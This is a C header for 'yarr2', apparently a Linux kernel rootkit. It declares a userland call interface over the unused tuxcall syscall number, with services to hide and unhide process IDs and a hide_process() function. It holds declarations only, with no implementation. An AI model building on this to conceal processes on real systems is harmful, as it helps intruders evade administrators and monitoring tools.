#ifndef __YARR_YARRLIB
#define __YARR_YARRLIB

// When including this file from a userland program we need to include
// sys/types.h, but this header file is not present in the kernel sources.
#ifndef __KERNEL__
    #include <sys/types.h>
#endif

// This is the vector used for accessing yarr2 services. It correspond to the
// tuxcall syscall. In my kernels it is not used in the 64-bit table, it is in
// the 32-bit one I think and there it doesn't belong to tuxcall. If your
// kernel does support tuxcall likely you would need to look for another number
// and build yarr2. In reality I think tuxcall is never implemented, that's why
// I chose it.
#define YARR_VECTOR (184)

// Here we define the different services someone can request to yarr2.
enum YARRCALL_SERVICE {
    HIDE_PID = 1,
    UNHIDE_PID,
    __GET_PROC_INFO
};

// TODO: I'm going to define all the argument types for services here. They
// should be declared in their own header files, encapsulated with the rest
// of their subsystem, but I want userland programs to be able to include this
// file and know about these arguments, so to keep things simple I just define
// everything down below.
typedef struct {
    pid_t pid;
} HidePidArgs_t;

typedef struct {
    pid_t pid;
    pid_t tgid;
} __GetProcInfoArgs_t;

// TODO: Example.
//typedef struct {
//    char *name;
//} HideFileArgs_t;

// Each service has its own arguments, we use this union to encapsulate them
// and have easier access for each service.
typedef union {
    HidePidArgs_t hidepid_args;
    // TODO: Example.
    //HideFileArgs_t hidefile_args;
    __GetProcInfoArgs_t getprocinfo_args;
} YarrcallArgs_t;

/**
 * The userland entry point. This is the function that developers using yarr2
 * should use in order to request services to yarr2 module (in theory already
 * loaded into the kernel).
 *
 * @svc: The type of service we request. This should be one of the values of
 * YARRCALL_SERVICES.
 * @args: A pointer to the arguments for that specific service.
 * @return: Zero on success, non-zero elsewhere.
 */
long yarrcall(int svc, YarrcallArgs_t *args);

/**
 * Asks yarr2 to hide a process in the system.
 *
 * @pid: The pid of the process to hide.
 * @return: Zero on sucess, non-zero elsewhere.
 */
long hide_process(pid_t pid);

#endif
